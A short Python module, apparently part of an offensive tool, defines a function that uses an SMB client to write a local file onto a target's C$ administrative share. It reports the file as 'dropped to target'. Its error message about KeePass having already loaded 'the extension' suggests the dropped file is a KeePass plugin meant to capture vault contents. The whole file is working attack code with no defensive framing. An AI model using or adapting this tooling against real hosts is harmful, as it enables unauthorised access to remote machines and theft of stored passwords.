#!/usr/bin/python3

import os

def upload(smbClient, destination: str, local_filepath: str):
    f = open(local_filepath, 'rb')

    try:
        smbClient.putFile("C$", destination, f.read)
    except Exception as e: 
        print(f"[-] {str(e)}")
        if "STATUS_SHARING_VIOLATION" in str(e):
            print("[*] This happens is KeePass is already running and has loaded the extension")

        f.close()
        return

    f.close()
    print(f"[+] File {os.path.basename(local_filepath)} dropped to target")
    pass

